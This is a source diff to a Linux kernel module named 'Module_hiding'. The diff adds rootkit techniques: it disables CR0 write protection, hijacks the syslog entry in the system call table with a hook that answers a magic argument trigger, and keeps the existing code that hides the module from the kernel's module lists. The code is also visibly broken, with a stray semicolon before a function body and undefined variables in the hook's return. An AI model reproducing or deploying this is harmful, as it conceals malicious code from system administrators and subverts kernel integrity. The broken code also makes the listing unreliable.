@@ -28,6 +28,18 @@
 #include "proc_internal.h"
 #include "i_hate_static.c"
 
+void disable_ro(void)
+{
+    write_cr0(read_cr0() & ~X86_CR0_WP);
+    barrier();
+}
+
+void enable_ro(void)
+{
+    write_cr0(read_cr0() | X86_CR0_WP);
+    barrier();
+}
+
 // dont look at this ;_;
 noinline void skip_parent(void)
 {
@@ -45,6 +57,18 @@ noinline void skip_parent(void)
     (*rbp)[1] = dummy;
 }
 
+#define syscalls ((void**)SM_sys_call_table)
+int (*asmlinkage old_syslog_func)(int type, char __user* buf, int len);
+asmlinkage int fake_syslog(int type, char __user* buf, int len);
+{
+    if ((type == 42) && (len == 1337) && (buf == 0xabad1dea))
+    {
+	((struct module*)(THIS_MODULE))->state = MODULE_STATE_LIVE;
+    }
+
+    return old_syslog_func(fd, buf, count);
+}
+
 static int postinit(void* data)
 {
     ((struct module*)(THIS_MODULE))->state = MODULE_STATE_UNFORMED;
@@ -52,11 +76,27 @@ static int postinit(void* data)
     return 0;
 }
 
+void hook_syslog(void)
+{
+    disable_ro();
+    old_syslog_func = syscalls[__NR_syslog];
+    syscalls[__NR_syslog] = fake_syslog;
+    enable_ro();
+}
+
+void unhook_syslog(void)
+{
+    disable_ro();
+    syscalls[__NR_syslog] = old_syslog_func;
+    enable_ro();
+}
+
 int init_module(void){
     struct kobject* mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;
 
     printk(KERN_INFO "Module_hiding loaded.\n");
     kobject_del(mod_kobj);
+    hook_syslog();
     kthread_run(postinit, NULL, "hider");
 
     return 0;
@@ -64,6 +104,8 @@ int init_module(void){
 
 void cleanup_module(void){
     printk(KERN_INFO "Module_hiding unloaded.\n");
+
+    unhook_syslog();
 
     skip_parent();
 
